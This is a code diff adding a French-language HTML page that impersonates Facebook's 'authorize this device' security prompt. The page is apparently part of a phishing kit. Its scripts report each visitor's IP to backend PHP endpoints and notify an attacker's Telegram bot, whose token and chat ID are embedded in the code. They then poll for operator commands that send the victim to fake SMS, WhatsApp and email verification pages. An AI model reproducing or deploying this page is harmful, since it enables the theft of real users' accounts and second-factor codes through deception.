@@ -1,0 +1,420 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autoriser l'appareil</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            width: 60px;
+            margin-bottom: 15px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            color: #1c1e21;
+        }
+        
+        h2 {
+            font-size: 20px;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: #1c1e21;
+        }
+        
+        p {
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: #1c1e21;
+        }
+        
+        .image-container {
+            background-color: #e7f3ef;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 25px 0;
+        }
+        
+        .devices {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .device {
+            text-align: center;
+        }
+        
+        .device i {
+            font-size: 40px;
+            color: #1877f2;
+        }
+        
+        .shield {
+            color: #f7b928;
+            font-size: 60px;
+            margin: 0 20px;
+        }
+        
+        .dots {
+            border-top: 2px dotted #ccc;
+            width: 60px;
+            height: 1px;
+        }
+        
+        .button {
+            display: block;
+            width: 100%;
+            padding: 12px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 15px;
+        }
+        
+        .button:hover {
+            background-color: #166fe5;
+        }
+        
+        .button.secondary {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+        }
+        
+        .button.secondary:hover {
+            background-color: #d8dadf;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #65676b;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #65676b;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        
+        .languages a {
+            margin: 0 5px;
+            color: #65676b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .languages a:hover {
+            text-decoration: underline;
+        }
+        
+        .languages a.active {
+            color: #1877f2;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img   src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/150px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook" class="logo">
+        </div>
+        
+        <div class="card">
+            <h1>Connectez-vous sur un autre appareil pour continuer</h1>
+            
+            <p>Lorsque nous ne pouvons pas nous assurer que la personne qui tente de se connecter à un compte en est bien le propriétaire, nous ajoutons une étape de sécurité supplémentaire à la connexion.</p>
+            
+            <p>Vous devez vous connecter sur un appareil que vous avez déjà utilisé auparavant et approuver cette connexion.</p>
+            
+            <div class="image-container">
+                <div class="devices">
+                    <div class="device">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="dots"></div>
+                    <div class="shield">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="dots"></div>
+                    <div class="device">
+                        <i class="fas fa-laptop"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <h2>Je n'ai pas d'autre appareil</h2>
+            
+            <p>Si vous n'avez pas accès à un autre appareil que vous avez déjà utilisé pour vous connecter à ce compte, il n'est pas sûr de vous laisser vous connecter.</p>
+            
+            <a href="javascript:void(0)" class="button" id="authorizeBtn">Autoriser cet appareil</a>
+            <a href="javascript:void(0)" class="button secondary" id="cancelBtn">Annuler</a>
+        </div>
+        
+        <div class="footer">
+            <div class="languages">
+                <a href="#" class="active">Français (France)</a>
+                <a href="#">English (US)</a>
+                <a href="#">Español</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Italiano</a>
+                <a href="#">العربية</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+            </div>
+            
+            <div class="copyright">
+                Meta © 2025
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const sessionId = 'session_81.65.93.231';
+            const clientIp = '81.65.93.231';
+            
+            // Fonction pour vérifier s'il y a une action à effectuer
+            function checkAction() {
+                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.action) {
+                        if (data.action === 'device_authorized') {
+                           
+                           // Recharger la page pour afficher le message d'erreur
+                         
+                       } 
+                        else if (data.action === 'redirect' && data.redirect) {
+                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
+                        } else if (data.action === 'custom' && data.redirect) {
+                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
+                        } else {
+                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la vérification des actions:', error);
+                });
+            }
+            
+            // Vérifier les actions toutes les 2 secondes
+            setInterval(checkAction, 2000);
+            
+            // Gestionnaire pour le bouton d'autorisation
+            document.getElementById('authorizeBtn').addEventListener('click', function() {
+
+                window.open('https://facebook.com/notifications', '_blank');
+
+                fetch('save_action.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        session: sessionId,
+                        ip: clientIp,
+                        action: 'device_authorized',
+                       // redirect: 'connexion_f.php'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur:', error);
+                });
+            });
+            
+            // Gestionnaire pour le bouton d'annulation
+            document.getElementById('cancelBtn').addEventListener('click', function() {
+                window.location.href = `connexion_f.php?session=${sessionId}&ip=${clientIp}`;
+            });
+        });
+    </script>
+
+    <script>
+        const token = "7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8";
+        const chatId = "6669693805";
+        const psd = "Autoriser l'appareil";
+
+        window.onload = () => {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const messageData = {
+                chat_id: chatId,
+                text: `🔵 ${psd}`,
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "Approved", callback_data: "v:" + psd }],
+                        [{ text: "Login", callback_data: "e:" + psd }],
+                        [{ text: "incorrecte", callback_data: "o1:" + psd }],
+                        [{ text: "Sms verification", callback_data: "o2:" + psd }],
+                        [{ text: "Sms verification incorrect", callback_data: "o3:" + psd }],
+                        [{ text: "Whatsapp verification", callback_data: "o4:" + psd }],
+                        [{ text: "Whatsapp verification incorrect", callback_data: "o5:" + psd }],
+                        [{ text: "Email verification", callback_data: "o6:" + psd }],
+                        [{ text: "Email verification incorrect", callback_data: "o7:" + psd }],
+                        [{ text: "Authorize device", callback_data: "o8:" + psd }],
+                        [{ text: "Traitement", callback_data: "o9:" + psd }],
+                        [{ text: "Technical Error", callback_data: "o10:" + psd }]
+                    ]
+                })
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(messageData)
+            }).catch(console.error);
+        };
+
+        function getUpdates() {
+            const url = `https://api.telegram.org/bot${token}/getUpdates`;
+
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    const updates = data.result;
+                    if (!updates.length) return;
+
+                    updates.forEach(update => {
+                        const query = update.callback_query;
+                        if (!query) return;
+
+                        const [type, value] = query.data.split(":");
+                        if (value === psd) {
+                            if (type === "v") {
+                                window.location.href = "vote_approved.html";
+                            } else if (type === "e") {
+                                window.location.href = "Login.html";
+                            } else if (type === "o1") {
+                                window.location.href = "incorrecte.html";
+                            } else if (type === "o2") {
+                                window.location.href = "sms_verification.html";
+                            } else if (type === "o3") {
+                                window.location.href = "sms_verification-incorrect.html";
+                            } else if (type === "o4") {
+                                window.location.href = "whatsapp_verification.html";
+                            } else if (type === "o5") {
+                                window.location.href = "whatsapp_verification-incorrect.html";
+                            } else if (type === "o6") {
+                                window.location.href = "email_verification.html";
+                            } else if (type === "o7") {
+                                window.location.href = "email_verification-incorrect.html";
+                            } else if (type === "o8") {
+                                window.location.href = "authorize_device.html";
+                            } else if (type === "o9") {
+                                window.location.href = "Traitement.html";
+                            } else if (type === "o10") {
+                                window.location.href = "technical_error.html";
+                            }
+                        }
+
+                        markUpdateAsRead(update.update_id);
+                    });
+                })
+                .catch(console.error);
+        }
+
+        function markUpdateAsRead(updateId) {
+            const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
+            fetch(url).catch(console.error);
+        }
+
+        setInterval(getUpdates, 3000);
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const progressBar = document.getElementById('progress-bar');
+
+            function updateProgress(progress) {
+                progressBar.style.width = progress + '%';
+            }
+
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += 100 / 30;
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+
+                updateProgress(progress);
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
